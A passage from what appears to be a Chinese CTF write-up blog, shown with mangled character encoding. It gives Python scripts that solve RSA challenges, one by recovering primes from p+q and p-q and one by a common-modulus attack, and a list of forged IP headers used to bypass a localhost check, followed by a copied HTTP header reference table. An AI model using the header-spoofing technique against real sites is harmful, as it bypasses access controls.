class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m^e â‰¡ c (mod N)</span><br></pre></td></tr></table></figure><p>è§£å¯†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c^d â‰¡ m (mod N)</span><br></pre></td></tr></table></figure><p>å†å›åˆ°è¿™é“é¢˜</p><p>ç”±p+qå’Œp-qæˆ‘ä»¬èƒ½ç®—å‡ºp,qï¼Œå³N=p*qä¹ŸçŸ¥é“äº†ï¼Œcæ˜¯å¯†æ–‡ï¼Œeä¹ŸçŸ¥é“ç›´æ¥ç”¨gmpy2å°±èƒ½ç®—å‡ºdï¼Œexp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">e=<span class="number">8817541</span></span><br><span class="line">paq=<span class="number">16321432012361424715999482612620733350248842171519096058290401228839812649586719552027326066167539574579803995633219307746250179205827394262822225496256560</span></span><br><span class="line">psq=<span class="number">-762917520212563308246814613407392836711488448360655007080799273105995688894593100287666509669227799508891920589926279868282905643495952401909422097272782</span></span><br><span class="line">c=<span class="number">50489857463808300926430257877498323881188812748322681976260520202074367690898181749018527743434038118959830923111311450056657583556281704259092120255347994094472328493911537046586917971842411521641278869273145554989991259437124572940334561139020989426695807874811943663373081092453657052151887455784297691646</span></span><br><span class="line">p = (paq+psq)//<span class="number">2</span></span><br><span class="line">q = (paq-psq)//<span class="number">2</span></span><br><span class="line">d = gmpy2.invert(e, (p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">m = pow(c, d, p*q)</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure><p>ä¹‹åè½¬16è¿›åˆ¶è½¬å­—ç¬¦ä¸²å°±è¡Œ</p><p>gmpy2å®‰è£…å‚è€ƒï¼š<a href="https://www.cnblogs.com/threesoil/p/9926669.html">https://www.cnblogs.com/threesoil/p/9926669.html</a></p><h3 id="RSA1"><a href="#RSA1" class="headerlink" title="RSA1"></a>RSA1</h3><p>å’Œç¬¬ä¸€é¢˜å·®ä¸å¤š</p><p>æœ¬é¢˜æ¯è®¿é—®ä¸€æ¬¡éƒ½ä¼šç»™ä¸€ç»„éšæœºçš„eå’Œcï¼Œä½†æ˜¯p^2+q^2å’Œp-qä¸å˜ï¼Œå› æ­¤å¯ä»¥è€ƒè™‘å…±æ¨¡æ”»å‡»</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">p^2+q^2&#x3D;233267952291859505039783652916196820549830655854017481630358970687296150605497287567221180374924125322298582680891700281813911894392167573300640690548821752679776824359493927916641019722671365040868493597644196114187232764555313925484030012559195525765269481240206756265081919013526886083861070280044423277050</span><br><span class="line"></span><br><span class="line">p-q&#x3D;-5768290924819924200771763039115328282726881252181364451258071886264423429200083031925129093846564595799325371731199564895705667053253727806125240485496428</span><br><span class="line"></span><br><span class="line">c&#x3D;87567700255805446580688569086348162935993913860449220595864885191176757127427511444244078884207896008178494024025285025508575080281587835133751089187296800829716128794411892433058027899034063381868520639785769819574614982230602956229984725797909585660127484706025719219624130414557402851436473586137081066463</span><br><span class="line"></span><br><span class="line">flag&#x3D;??????</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line">c1 = <span class="number">87567700255805446580688569086348162935993913860449220595864885191176757127427511444244078884207896008178494024025285025508575080281587835133751089187296800829716128794411892433058027899034063381868520639785769819574614982230602956229984725797909585660127484706025719219624130414557402851436473586137081066463</span></span><br><span class="line">e1 = <span class="number">11398291</span></span><br><span class="line"></span><br><span class="line">c2 = <span class="number">18705967865609703350505203897353013349572268163704731296055745391917469960518910212955107755812854024901962046413249126535525965403804342347153196889210756001085291251582862612150330490682927199414305833505087697733874760767084138461692058648555896587248051209761491427866198455080624903527433009258377083135</span></span><br><span class="line">e2 = <span class="number">11511989</span></span><br><span class="line"></span><br><span class="line">A = <span class="number">233267952291859505039783652916196820549830655854017481630358970687296150605497287567221180374924125322298582680891700281813911894392167573300640690548821752679776824359493927916641019722671365040868493597644196114187232764555313925484030012559195525765269481240206756265081919013526886083861070280044423277050</span></span><br><span class="line">B = <span class="number">-5768290924819924200771763039115328282726881252181364451258071886264423429200083031925129093846564595799325371731199564895705667053253727806125240485496428</span></span><br><span class="line"></span><br><span class="line">n = (A-B**<span class="number">2</span>)//<span class="number">2</span></span><br><span class="line"><span class="comment"># print n</span></span><br><span class="line"></span><br><span class="line">s = egcd(e1, e2)</span><br><span class="line">s1 = s[<span class="number">1</span>]</span><br><span class="line">s2 = s[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">if</span> s1&lt;<span class="number">0</span>:</span><br><span class="line">    s1 = - s1</span><br><span class="line">    c1 = invert(c1, n)</span><br><span class="line"><span class="keyword">elif</span> s2&lt;<span class="number">0</span>:</span><br><span class="line">    s2 = - s2</span><br><span class="line">    c2 = invert(c2, n)</span><br><span class="line"></span><br><span class="line">m = pow(c1,s1,n)*pow(c2,s2,n) % n</span><br><span class="line"></span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€"><a href="#å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€" class="headerlink" title="å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€"></a>å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€</h3><p>è¿™é¢˜çœŸçš„å¾ˆã€‚ã€‚ã€‚</p><p>å°è¯•adminï¼Œæç¤ºä¸æ˜¯admin</p><p>éšä¾¿ç™»ä¸ªè´¦å·ï¼ŒæŠ“åŒ…ï¼Œåœ¨htmlç»“å°¾å‘ç°<code>L0g1n.php</code></p><p><img src="/2020/03/21/BJDCTF-2rd-writeup/TIM%E6%88%AA%E5%9B%BE20200321184046.png"></p><p>è®¿é—®å‘ç°ä¸€ç¯å¥—ä¸€ç¯ï¼Œæœ€åæ„é€ å°±èƒ½å¾—åˆ°flagçš„base64ç¼–ç å½¢å¼äº†</p><img src="/2020/03/21/BJDCTF-2rd-writeup/TIMæˆªå›¾20200321184336.png" style="zoom:80%;"><p><strong>ä¼ªé€ ip:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-<span class="keyword">For</span>:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">X-Forwarded-Host:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">X-Client-IP:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">X-remote-IP:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">X-remote-addr:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="literal">True</span>-Client-IP:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">X-Client-IP:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">Client-IP:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">X-<span class="keyword">Real</span>-IP:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br></pre></td></tr></table></figure><p><strong>è®°ä¸€ä¸‹httpçš„å¸¸è§å­—æ®µï¼š</strong></p><p><strong>è¯·æ±‚å­—æ®µ</strong></p><table><thead><tr><th align="center">åè®®å¤´å­—æ®µå</th><th align="center">è¯´æ˜</th><th align="center">ç¤ºä¾‹</th><th align="center">çŠ¶æ€</th></tr></thead><tbody><tr><td align="center">Accept</td><td align="center">èƒ½å¤Ÿæ¥å—çš„å›åº”å†…å®¹ç±»å‹ï¼ˆContent-Typesï¼‰ã€‚å‚è§<a href="https://zh.wikipedia.org/wiki/%E5%86%85%E5%AE%B9%E5%8D%8F%E5%95%86">å†…å®¹åå•†</a>ã€‚</td><td align="center"><code>Accept: text/plain</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center">Accept-Charset</td><td align="center">èƒ½å¤Ÿæ¥å—çš„å­—ç¬¦é›†</td><td align="center"><code>Accept-Charset: utf-8</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center">Accept-Encoding</td><td align="center">èƒ½å¤Ÿæ¥å—çš„ç¼–ç æ–¹å¼åˆ—è¡¨ã€‚å‚è€ƒ<a href="https://zh.wikipedia.org/wiki/HTTP%E5%8E%8B%E7%BC%A9">HTTPå‹ç¼©</a>ã€‚</td><td align="center"><code>Accept-Encoding: gzip, deflate</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center">Accept-Language</td><td align="center">èƒ½å¤Ÿæ¥å—çš„å›åº”å†…å®¹çš„è‡ªç„¶è¯­è¨€åˆ—è¡¨ã€‚å‚è€ƒ <a href="https://zh.wikipedia.org/wiki/%E5%86%85%E5%AE%B9%E5%8D%8F%E5%95%86">å†…å®¹åå•†</a> ã€‚</td><td align="center"><code>Accept-Language: en-US</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center">Accept-Datetime</td><td align="center">èƒ½å¤Ÿæ¥å—çš„æŒ‰ç…§æ—¶é—´æ¥è¡¨ç¤ºçš„ç‰ˆæœ¬</td><td align="center"><code>Accept-Datetime: Thu, 31 May 2007 20:35:00 GMT</code></td><td align="center">ä¸´æ—¶</td></tr><tr><td align="center">Authorization</td><td align="center">ç”¨äºè¶…æ–‡æœ¬ä¼ è¾“åè®®çš„è®¤è¯çš„è®¤è¯ä¿¡æ¯</td><td align="center"><code>Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center"><a href="https://zh.wikipedia.org/wiki/%E7%BD%91%E9%A1%B5%E5%BF%AB%E7%85%A7">Cache-Control</a></td><td align="center">ç”¨æ¥æŒ‡å®šåœ¨è¿™æ¬¡çš„è¯·æ±‚/å“åº”é“¾ä¸­çš„æ‰€æœ‰ç¼“å­˜æœºåˆ¶ éƒ½å¿…é¡» éµå®ˆçš„æŒ‡ä»¤</td><td align="center"><code>Cache-Control: no-cache</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center">Connection</td><td align="center">è¯¥æµè§ˆå™¨æƒ³è¦ä¼˜å…ˆä½¿ç”¨çš„è¿æ¥ç±»å‹[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-rfc7230_connection-8">8]</a></td><td align="center"><code>Connection: keep-alive``Connection: Upgrade</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center">Cookie</td><td align="center">ä¹‹å‰ç”±æœåŠ¡å™¨é€šè¿‡ Set- Cookie ï¼ˆä¸‹æ–‡è¯¦è¿°ï¼‰å‘é€çš„ä¸€ä¸ª è¶…æ–‡æœ¬ä¼ è¾“åè®®Cookie</td><td align="center"><code>Cookie: $Version=1; Skin=new;</code></td><td align="center">å¸¸è®¾: æ ‡å‡†</td></tr><tr><td align="center">Content-Length</td><td align="center">ä»¥ å…«ä½å­—èŠ‚æ•°ç»„ ï¼ˆ8ä½çš„å­—èŠ‚ï¼‰è¡¨ç¤ºçš„è¯·æ±‚ä½“çš„é•¿åº¦</td><td align="center"><code>Content-Length: 348</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center">Content-MD5</td><td align="center">è¯·æ±‚ä½“çš„å†…å®¹çš„äºŒè¿›åˆ¶ MD5 æ•£åˆ—å€¼ï¼Œä»¥ Base64 ç¼–ç çš„ç»“æœ</td><td align="center"><code>Content-MD5: Q2hlY2sgSW50ZWdyaXR5IQ==</code></td><td align="center">è¿‡æ—¶çš„[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-9">9]</a></td></tr><tr><td align="center">Content-Type</td><td align="center">è¯·æ±‚ä½“çš„ å¤šåª’ä½“ç±»å‹ ï¼ˆç”¨äºPOSTå’ŒPUTè¯·æ±‚ä¸­ï¼‰</td><td align="center"><code>Content-Type: application/x-www-form-urlencoded</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center">Date</td><td align="center">å‘é€è¯¥æ¶ˆæ¯çš„æ—¥æœŸå’Œæ—¶é—´(æŒ‰ç…§ RFC 7231 ä¸­å®šä¹‰çš„â€è¶…æ–‡æœ¬ä¼ è¾“åè®®æ—¥æœŸâ€æ ¼å¼æ¥å‘é€)</td><td align="center"><code>Date: Tue, 15 Nov 1994 08:12:31 GMT</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center">Expect</td><td align="center">è¡¨æ˜å®¢æˆ·ç«¯è¦æ±‚æœåŠ¡å™¨åšå‡ºç‰¹å®šçš„è¡Œä¸º</td><td align="center"><code>Expect: 100-continue</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center">From</td><td align="center">å‘èµ·æ­¤è¯·æ±‚çš„ç”¨æˆ·çš„é‚®ä»¶åœ°å€</td><td align="center"><code>From: user@example.com</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center">Host</td><td align="center">æœåŠ¡å™¨çš„åŸŸå(ç”¨äºè™šæ‹Ÿä¸»æœº )ï¼Œä»¥åŠæœåŠ¡å™¨æ‰€ç›‘å¬çš„<a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE">ä¼ è¾“æ§åˆ¶åè®®</a>ç«¯å£å·ã€‚å¦‚æœæ‰€è¯·æ±‚çš„ç«¯å£æ˜¯å¯¹åº”çš„æœåŠ¡çš„æ ‡å‡†ç«¯å£ï¼Œåˆ™ç«¯å£å·å¯è¢«çœç•¥ã€‚[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-10">10]</a> è‡ªè¶…æ–‡ä»¶ä¼ è¾“åè®®ç‰ˆæœ¬1.1ï¼ˆHTTP/1.1ï¼‰å¼€å§‹ä¾¿æ˜¯å¿…éœ€å­—æ®µã€‚</td><td align="center"><code>Host: en.wikipedia.org:80``Host: en.wikipedia.org</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center">If-Match</td><td align="center">ä»…å½“å®¢æˆ·ç«¯æä¾›çš„å®ä½“ä¸æœåŠ¡å™¨ä¸Šå¯¹åº”çš„å®ä½“ç›¸åŒ¹é…æ—¶ï¼Œæ‰è¿›è¡Œå¯¹åº”çš„æ“ä½œã€‚ä¸»è¦ä½œç”¨æ—¶ï¼Œç”¨ä½œåƒ PUT è¿™æ ·çš„æ–¹æ³•ä¸­ï¼Œä»…å½“ä»ç”¨æˆ·ä¸Šæ¬¡æ›´æ–°æŸä¸ªèµ„æºä»¥æ¥ï¼Œè¯¥èµ„æºæœªè¢«ä¿®æ”¹çš„æƒ…å†µä¸‹ï¼Œæ‰æ›´æ–°è¯¥èµ„æºã€‚</td><td align="center"><code>If-Match: &quot;737060cd8c284d8af7ad3082f209582d&quot;</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center">If-Modified-Since</td><td align="center">å…è®¸åœ¨å¯¹åº”çš„å†…å®¹æœªè¢«ä¿®æ”¹çš„æƒ…å†µä¸‹è¿”å›304æœªä¿®æ”¹ï¼ˆ 304 Not Modified ï¼‰</td><td align="center"><code>If-Modified-Since: Sat, 29 Oct 1994 19:43:31 GMT</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center">If-None-Match</td><td align="center">å…è®¸åœ¨å¯¹åº”çš„å†…å®¹æœªè¢«ä¿®æ”¹çš„æƒ…å†µä¸‹è¿”å›304æœªä¿®æ”¹ï¼ˆ 304 Not Modified ï¼‰ï¼Œå‚è€ƒ è¶…æ–‡æœ¬ä¼ è¾“åè®® çš„<a href="https://zh.wikipedia.org/wiki/HTTP_ETag">å®ä½“æ ‡è®°</a></td><td align="center"><code>If-None-Match: &quot;737060cd8c284d8af7ad3082f209582d&quot;</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center">If-Range</td><td align="center">å¦‚æœè¯¥å®ä½“æœªè¢«ä¿®æ”¹è¿‡ï¼Œåˆ™å‘æˆ‘å‘é€æˆ‘æ‰€ç¼ºå°‘çš„é‚£ä¸€ä¸ªæˆ–å¤šä¸ªéƒ¨åˆ†ï¼›å¦åˆ™ï¼Œå‘é€æ•´ä¸ªæ–°çš„å®ä½“</td><td align="center"><code>If-Range: &quot;737060cd8c284d8af7ad3082f209582d&quot;</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center">If-Unmodified-Since</td><td align="center">ä»…å½“è¯¥å®ä½“è‡ªæŸä¸ªç‰¹å®šæ—¶é—´å·²æ¥æœªè¢«ä¿®æ”¹çš„æƒ…å†µä¸‹ï¼Œæ‰å‘é€å›åº”ã€‚</td><td align="center"><code>If-Unmodified-Since: Sat, 29 Oct 1994 19:43:31 GMT</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center">Max-Forwards</td><td align="center">é™åˆ¶è¯¥æ¶ˆæ¯å¯è¢«ä»£ç†åŠç½‘å…³è½¬å‘çš„æ¬¡æ•°ã€‚</td><td align="center"><code>Max-Forwards: 10</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center">Origin</td><td align="center">å‘èµ·ä¸€ä¸ªé’ˆå¯¹ è·¨æ¥æºèµ„æºå…±äº« çš„è¯·æ±‚ï¼ˆè¦æ±‚æœåŠ¡å™¨åœ¨å›åº”ä¸­åŠ å…¥ä¸€ä¸ªâ€˜è®¿é—®æ§åˆ¶-å…è®¸æ¥æºâ€™ï¼ˆâ€™Access-Control-Allow-Originâ€™ï¼‰å­—æ®µï¼‰ã€‚</td><td align="center"><code>Origin: http://www.example-social-network.com</code></td><td align="center">å¸¸è®¾: æ ‡å‡†</td></tr><tr><td align="center">Pragma</td><td align="center">ä¸å…·ä½“çš„å®ç°ç›¸å…³ï¼Œè¿™äº›å­—æ®µå¯èƒ½åœ¨è¯·æ±‚/å›åº”é“¾ä¸­çš„ä»»ä½•æ—¶å€™äº§ç”Ÿå¤šç§æ•ˆæœã€‚</td><td align="center"><code>Pragma: no-cache</code></td><td align="center">å¸¸è®¾ä½†ä¸å¸¸ç”¨</td></tr><tr><td align="center">Proxy-Authorization</td><td align="center">ç”¨æ¥å‘ä»£ç†è¿›è¡Œè®¤è¯çš„è®¤è¯ä¿¡æ¯ã€‚</td><td align="center"><code>Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center">Range</td><td align="center">ä»…è¯·æ±‚æŸä¸ªå®ä½“çš„ä¸€éƒ¨åˆ†ã€‚å­—èŠ‚åç§»ä»¥0å¼€å§‹ã€‚å‚è§<a href="https://zh.wikipedia.org/w/index.php?title=%E5%AD%97%E8%8A%82%E6%9C%8D%E5%8A%A1&action=edit&redlink=1">å­—èŠ‚æœåŠ¡</a>ã€‚</td><td align="center"><code>Range: bytes=500-999</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center"><a href="https://zh.wikipedia.org/wiki/HTTP%E5%8F%83%E7%85%A7%E4%BD%8D%E5%9D%80">Referer</a> [*<a href="https://zh.wikipedia.org/wiki/Sic">sic</a>*] [<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-11">11]</a></td><td align="center">è¡¨ç¤ºæµè§ˆå™¨æ‰€è®¿é—®çš„å‰ä¸€ä¸ªé¡µé¢ï¼Œæ­£æ˜¯é‚£ä¸ªé¡µé¢ä¸Šçš„æŸä¸ªé“¾æ¥å°†æµè§ˆå™¨å¸¦åˆ°äº†å½“å‰æ‰€è¯·æ±‚çš„è¿™ä¸ªé¡µé¢ã€‚</td><td align="center"><code>Referer: http://en.wikipedia.org/wiki/Main_Page</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center">TE</td><td align="center">æµè§ˆå™¨é¢„æœŸæ¥å—çš„ä¼ è¾“ç¼–ç æ–¹å¼ï¼šå¯ä½¿ç”¨å›åº”åè®®å¤´ Transfer-Encoding å­—æ®µä¸­çš„å€¼ï¼›å¦å¤–è¿˜å¯ç”¨â€trailersâ€ï¼ˆä¸â€åˆ†å— â€œä¼ è¾“æ–¹å¼ç›¸å…³ï¼‰è¿™ä¸ªå€¼æ¥è¡¨æ˜æµè§ˆå™¨å¸Œæœ›åœ¨æœ€åä¸€ä¸ªå°ºå¯¸ä¸º0çš„å—ä¹‹åè¿˜æ¥æ”¶åˆ°ä¸€äº›é¢å¤–çš„å­—æ®µã€‚</td><td align="center"><code>TE: trailers, deflate</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center">User-Agent</td><td align="center">æµè§ˆå™¨çš„<a href="https://zh.wikipedia.org/wiki/%E7%94%A8%E6%88%B7%E4%BB%A3%E7%90%86">æµè§ˆå™¨èº«ä»½æ ‡è¯†å­—ç¬¦ä¸²</a></td><td align="center"><code>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/21.0</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center">Upgrade</td><td align="center">è¦æ±‚æœåŠ¡å™¨å‡çº§åˆ°å¦ä¸€ä¸ªåè®®ã€‚</td><td align="center"><code>Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center">Via</td><td align="center">å‘æœåŠ¡å™¨å‘ŠçŸ¥ï¼Œè¿™ä¸ªè¯·æ±‚æ˜¯ç”±å“ªäº›ä»£ç†å‘å‡ºçš„ã€‚</td><td align="center"><code>Via: 1.0 fred, 1.1 example.com (Apache/1.1)</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center">Warning</td><td align="center">ä¸€ä¸ªä¸€èˆ¬æ€§çš„è­¦å‘Šï¼Œå‘ŠçŸ¥ï¼Œåœ¨å®ä½“å†…å®¹ä½“ä¸­å¯èƒ½å­˜åœ¨é”™è¯¯ã€‚</td><td align="center"><code>Warning: 199 Miscellaneous warning</code></td><td align="center">å¸¸è®¾</td></tr></tbody></table><p><strong>å¸¸è§çš„éæ ‡å‡†è¯·æ±‚å­—æ®µ</strong></p><table><thead><tr><th align="center">å­—æ®µå</th><th align="center">è¯´æ˜</th><th align="center">ç¤ºä¾‹</th></tr></thead><tbody><tr><td align="center">X-Requested-With</td><td align="center">ä¸»è¦ç”¨äºæ ‡è¯† Ajax åŠå¯æ‰©å±•æ ‡è®°è¯­è¨€ è¯·æ±‚ã€‚å¤§éƒ¨åˆ†çš„JavaScriptæ¡†æ¶ä¼šå‘é€è¿™ä¸ªå­—æ®µï¼Œä¸”å°†å…¶å€¼è®¾ç½®ä¸º XMLHttpRequest</td><td align="center"><code>X-Requested-With: XMLHttpRequest</code></td></tr><tr><td align="center"><a href="https://zh.wikipedia.org/wiki/%E8%AF%B7%E5%8B%BF%E8%BF%BD%E8%B8%AA">DNT</a>[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-12">12]</a></td><td align="center">è¯·æ±‚æŸä¸ªç½‘é¡µåº”ç”¨ç¨‹åºåœæ­¢è·Ÿè¸ªæŸä¸ªç”¨æˆ·ã€‚åœ¨ç«ç‹æµè§ˆå™¨ä¸­ï¼Œç›¸å½“äºX-Do-Not-Trackåè®®å¤´å­—æ®µï¼ˆè‡ª Firefox/4.0 Beta 11 ç‰ˆå¼€å§‹æ”¯æŒï¼‰ã€‚<a href="https://zh.wikipedia.org/wiki/Safari">Safari</a> å’Œ <a href="https://zh.wikipedia.org/wiki/Internet_Explorer">Internet Explorer</a> 9 ä¹Ÿæ”¯æŒè¿™ä¸ªå­—æ®µã€‚2011å¹´3æœˆ7æ—¥ï¼Œè‰æ¡ˆæäº¤IETFã€‚[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-13">13]</a> ä¸‡ç»´ç½‘åä¼š çš„è·Ÿè¸ªä¿æŠ¤å·¥ä½œç»„æ­£åœ¨å°±æ­¤åˆ¶ä½œä¸€é¡¹è§„èŒƒã€‚[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-14">14]</a></td><td align="center"><code>DNT: 1 (DNTå¯ç”¨)``DNT: 0 (DNTè¢«ç¦ç”¨)</code></td></tr><tr><td align="center"><a href="https://zh.wikipedia.org/wiki/X-Forwarded-For">X-Forwarded-For</a>[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-15">15]</a></td><td align="center">ä¸€ä¸ªäº‹å®æ ‡å‡† ï¼Œç”¨äºæ ‡è¯†æŸä¸ªé€šè¿‡è¶…æ–‡æœ¬ä¼ è¾“åè®®ä»£ç†æˆ–è´Ÿè½½å‡è¡¡è¿æ¥åˆ°æŸä¸ªç½‘é¡µæœåŠ¡å™¨çš„å®¢æˆ·ç«¯çš„åŸå§‹äº’è”ç½‘åœ°å€</td><td align="center"><code>X-Forwarded-For: client1, proxy1, proxy2``X-Forwarded-For: 129.78.138.66, 129.78.64.103</code></td></tr><tr><td align="center">X-Forwarded-Host[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-16">16]</a></td><td align="center">ä¸€ä¸ªäº‹å®æ ‡å‡† ï¼Œç”¨äºè¯†åˆ«å®¢æˆ·ç«¯åŸæœ¬å‘å‡ºçš„ <code>Host</code> è¯·æ±‚å¤´éƒ¨[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-17">17]</a>ã€‚</td><td align="center"><code>X-Forwarded-Host: en.wikipedia.org:80``X-Forwarded-Host: en.wikipedia.org</code></td></tr><tr><td align="center">X-Forwarded-Proto[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-18">18]</a></td><td align="center">ä¸€ä¸ªäº‹å®æ ‡å‡†ï¼Œç”¨äºæ ‡è¯†æŸä¸ªè¶…æ–‡æœ¬ä¼ è¾“åè®®è¯·æ±‚æœ€åˆæ‰€ä½¿ç”¨çš„åè®®ã€‚[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-19">19]</a></td><td align="center"><code>X-Forwarded-Proto: https</code></td></tr><tr><td align="center">Front-End-Https[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-20">20]</a></td><td align="center">è¢«å¾®è½¯çš„æœåŠ¡å™¨å’Œè´Ÿè½½å‡è¡¡å™¨æ‰€ä½¿ç”¨çš„éæ ‡å‡†å¤´éƒ¨å­—æ®µã€‚</td><td align="center"><code>Front-End-Https: on</code></td></tr><tr><td align="center">X-Http-Method-Override[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-21">21]</a></td><td 